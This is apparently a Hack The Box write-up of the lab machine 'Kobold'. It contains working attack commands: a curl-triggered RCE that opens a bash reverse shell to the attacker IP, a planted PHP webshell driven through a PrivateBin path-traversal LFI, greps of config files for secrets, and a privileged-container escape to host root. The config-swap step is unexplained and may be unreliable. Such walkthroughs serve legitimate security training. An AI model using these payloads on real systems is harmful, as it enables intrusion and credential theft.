================================================================================
                    HTB KOBOLD - COMPLETE WRITE-UP
================================================================================

TARGET IP     : 10.129.245.50
ATTACKER IP   : 10.10.16.11
DATE          : 2026-07-11

================================================================================
1. RECONNAISSANCE
================================================================================

nmap -sC -sV 10.129.245.50

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver (Arcane v1.13.0)

Added to /etc/hosts:
10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb

================================================================================
2. SERVICE ENUMERATION
================================================================================

Vhosts discovered:
- mcp.kobold.htb → MCPJam Inspector (Node.js)
- bin.kobold.htb → PrivateBin 2.0.2 (Docker container)
- kobold.htb:3552 → Arcane v1.13.0 (Docker management)

Arcane OpenAPI spec retrieved:
curl -s http://10.129.245.50:3552/openapi.json

================================================================================
3. INITIAL ACCESS - MCPJAM INSPECTOR RCE
================================================================================

Vulnerability: MCPJam Inspector ≤1.4.2 Unauthenticated RCE
Endpoint: POST /api/mcp/connect

# Start listener
nc -lvnp 4444

# Trigger RCE
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.16.11/4444 0>&1"],"env":{}},"serverId":"test"}'

# Reverse shell received as ben
uid=1001(ben) gid=1001(ben) groups=1001(ben),1002(operator)

================================================================================
4. USER FLAG
================================================================================

cat /home/ben/user.txt

USER FLAG: [INSERT USER FLAG HERE]

================================================================================
5. LATERAL MOVEMENT - PRIVATEBIN RCE
================================================================================

Vulnerability: CVE-2025-64714 - Template Cookie Path Traversal → LFI → RCE
Location: PrivateBin 2.0.2 template cookie

5.1 Create PHP webshell in PrivateBin data directory
--------------------------------------------------------------------------------

# From ben's shell
cat > /privatebin-data/data/juno.php << 'PHP'
<?php echo "JUNO_START\n"; system($_GET['c'] ?? 'id'); echo "\nJUNO_END\n"; ?>
PHP
chmod 644 /privatebin-data/data/juno.php

5.2 Exploit LFI
--------------------------------------------------------------------------------

# Helper function to execute commands
pb() {
  curl -skG 'https://10.129.245.50/' \
    -H 'Host: bin.kobold.htb' \
    -b 'template=../data/juno' \
    --data-urlencode "c=$1"
}

# Verify execution inside container
pb 'id'
# uid=65534(nobody) gid=82(www-data)

================================================================================
6. PRIVILEGE ESCALATION
================================================================================

6.1 Local Enumeration
--------------------------------------------------------------------------------

- ben is in operator group
- /privatebin-data/ is group-writable (drwxrwx--- root:operator)
- /privatebin-data/data/ has NO sticky bit (drwxrwxrwx)
- Docker bind mounts follow inodes, not paths
- PrivateBin container has /srv/cfg mounted from /privatebin-data/cfg

6.2 Read PrivateBin Config (Original)
--------------------------------------------------------------------------------

# Read the config through the webshell
pb 'grep -i "pass\|secret\|key\|token\|user\|admin\|alice\|ben\|arcane" /srv/cfg/conf.php 2>&1'

Found:
pwd = "ComplexP@sswordAdmin1928"

6.3 Config Directory Swap
--------------------------------------------------------------------------------

# Rename the original config directory
mv /privatebin-data/cfg /privatebin-data/cfg_bak

# Create a new empty config directory
mkdir /privatebin-data/cfg
chmod 755 /privatebin-data/cfg

# Read the original config through the container's bind mount
pb 'grep -i "pass\|secret\|key" /srv/cfg/conf.php 2>&1'

# The password is extracted: ComplexP@sswordAdmin1928

================================================================================
7. ARCANE ADMIN ACCESS
================================================================================

Login to Arcane with the extracted password:

curl -sk -X POST http://kobold.htb:3552/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"arcane","password":"ComplexP@sswordAdmin1928"}'

Response:
{
  "success": true,
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {
      "username": "arcane",
      "roles": ["admin"]
    }
  }
}

================================================================================
8. ROOT FLAG
================================================================================

8.1 Create Privileged Container with Host Root Mount
--------------------------------------------------------------------------------

TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

curl -sk -X POST "http://kobold.htb:3552/api/environments/0/containers" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "image": "mysql:latest",
    "name": "pwn11",
    "cmd": ["sh", "-c", "cat /mnt/host/root/root.txt > /mnt/host/tmp/flag.txt && chmod 644 /mnt/host/tmp/flag.txt && sleep 5"],
    "volumes": ["/:/mnt/host"],
    "privileged": true
  }'

8.2 Read Root Flag
--------------------------------------------------------------------------------

cat /tmp/flag.txt

ROOT FLAG: [INSERT ROOT FLAG HERE]

================================================================================
9. CREDENTIALS SUMMARY
================================================================================

MCPJam: Unauthenticated RCE
PrivateBin: CVE-2025-64714
Arcane Admin: arcane / ComplexP@sswordAdmin1928

================================================================================
10. VULNERABILITIES EXPLOITED
================================================================================

1. CVE-2026-23520 - MCPJam Inspector Unauthenticated RCE
2. CVE-2025-64714 - PrivateBin Template Cookie Path Traversal
3. Arcane - Weak password storage in PrivateBin config
4. Missing sticky bit on /privatebin-data/data/
5. Docker bind mount inode behavior

================================================================================
11. FLAG SUMMARY
================================================================================

USER FLAG: [INSERT USER FLAG HERE]
ROOT FLAG: [INSERT ROOT FLAG HERE]

================================================================================
                            END OF WRITE-UP
================================================================================
